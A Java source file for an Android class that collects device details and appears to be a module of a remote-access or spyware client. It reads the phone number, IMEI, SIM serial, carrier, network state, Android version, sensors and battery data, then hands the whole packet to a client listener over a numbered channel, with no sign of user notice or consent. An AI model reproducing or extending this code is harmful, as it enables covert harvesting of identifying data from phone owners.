package my.app.Library;

import java.util.ArrayList;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.hardware.Sensor;
import android.hardware.SensorManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.telephony.TelephonyManager;
import my.app.client.ClientListener;
import Packet.AdvancedInformationPacket;

public class AdvancedSystemInfo {

	boolean waitingBattery = true;
	ClientListener ctx;
	int channel;
	AdvancedInformationPacket p;
	
	public AdvancedSystemInfo(ClientListener c, int channel) {
		p = new AdvancedInformationPacket();
		ctx = c;
		this.channel = channel;
	}
		
	public void getInfos() {
	
		phoneInfo();
		networkInfo();
		androidInfo();
		sensorsInfo();
		
		ctx.registerReceiver(this.batteryInfoReceiver,	new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		/*while(waitingBattery) {
			try {
				Thread.sleep(10);
			} catch(Exception e) {}
		}*/
		
		//ctx.handleData(channel, p.build());
	}
	
	public void phoneInfo() {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        p.setPhoneNumber(tm.getLine1Number());
        p.setIMEI(tm.getDeviceId());
        p.setSoftwareVersion(tm.getDeviceSoftwareVersion());
        p.setCountryCode(tm.getNetworkCountryIso());
        p.setOperatorCode(tm.getNetworkOperator());
        p.setOperatorName(tm.getNetworkOperatorName());
        p.setSimOperatorCode(tm.getSimOperator());
        p.setSimOperatorName(tm.getSimOperatorName());
        p.setSimCountryCode(tm.getSimCountryIso());
        p.setSimSerial(tm.getSimSerialNumber());
	}
	
	public void networkInfo() {
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo network = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        p.setWifiAvailable(network.isAvailable());
        p.setWifiConnectedOrConnecting(network.isConnectedOrConnecting());
        p.setWifiExtraInfos(network.getExtraInfo());
        p.setWifiReason(network.getReason());
        
        network = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

        if(network != null && (network.getSubtype() == TelephonyManager.NETWORK_TYPE_GPRS || network.getSubtype() == TelephonyManager.NETWORK_TYPE_EDGE)) {
        	p.setMobileNetworkName("2g");
        }
        else
        	p.setMobileNetworkName("3g");
        
        p.setMobileNetworkAvailable(network.isAvailable());
        p.setMobileNetworkConnectedOrConnecting(network.isConnectedOrConnecting());
        p.setMobileNetworkExtraInfos(network.getExtraInfo());
        p.setMobileNetworkReason(network.getReason());
	}
	
	public void androidInfo() {
		p.setAndroidVersion(android.os.Build.VERSION.RELEASE);
		p.setAndroidSdk(android.os.Build.VERSION.SDK_INT);
	}
	
	public void sensorsInfo() {
    	SensorManager mSensorManager= (SensorManager) ctx.getSystemService(Context.SENSOR_SERVICE);

        // List of Sensors Available
        List<Sensor> msensorList = mSensorManager.getSensorList(Sensor.TYPE_ALL);

        ArrayList<String> sensors = new ArrayList<String> ();
        for(Sensor s: msensorList) {
        	sensors.add(s.getName());
        }
        p.setSensors(sensors);
	}
	
	
    private BroadcastReceiver batteryInfoReceiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {//http://developer.android.com/reference/android/os/BatteryManager.html
			int  health= intent.getIntExtra(BatteryManager.EXTRA_HEALTH,0);
			int  level= intent.getIntExtra(BatteryManager.EXTRA_LEVEL,0);
			int  plugged= intent.getIntExtra(BatteryManager.EXTRA_PLUGGED,0);
			boolean  present= intent.getExtras().getBoolean(BatteryManager.EXTRA_PRESENT);
			int  scale= intent.getIntExtra(BatteryManager.EXTRA_SCALE,0);
			int  status= intent.getIntExtra(BatteryManager.EXTRA_STATUS,0);
			String  technology= intent.getExtras().getString(BatteryManager.EXTRA_TECHNOLOGY);
			int  temperature= intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE,0);
			int  voltage= intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE,0);
			
			p.setBatteryHealth(health);
			p.setBatteryLevel(level);
			p.setBatteryPlugged(plugged);
			p.setBatteryPresent(present);
			p.setBatteryScale(scale);
			p.setBatteryStatus(status);
			p.setBatteryTechnology(technology);
			p.setBatteryTemperature(temperature);
			p.setBatteryVoltage(voltage);

			//waitingBattery = false;
			ctx.handleData(channel, p.build());
			
			ctx.unregisterReceiver(batteryInfoReceiver);
		}
	};
}
